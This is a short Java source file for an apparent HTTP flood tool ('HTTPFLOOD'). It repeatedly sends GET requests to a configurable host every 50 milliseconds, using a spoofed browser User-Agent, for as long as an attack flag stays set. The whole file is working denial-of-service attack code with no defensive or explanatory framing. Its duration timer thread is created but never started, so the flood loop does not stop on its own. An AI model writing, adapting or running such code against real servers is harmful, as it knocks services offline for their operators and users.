package com.turbokot.httpflood;

import java.net.HttpURLConnection;
import java.net.URL;

public class HTTPFLOOD {
    public static String host;
    public static Integer duration;
    public static boolean attackRunning = false;

    public static void run() throws Throwable {
        if (!attackRunning) {
            attackRunning = true;
        }
        new Thread(() -> {
            for (int i = 0; i < duration; ++i) {
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException var2) {
                }
            }
            attackRunning = false;
        });
        while(attackRunning){
            try{
                URL url = new URL(host);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.addRequestProperty("Keep-Alive", "10");
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(5000);
                connection.addRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0");
                connection.getResponseCode();
                System.out.println("Request sent!");
                Thread.sleep(50);
            }catch (Exception e){
                System.out.println("Err: " + e.getMessage());
            }
        }
    }
}
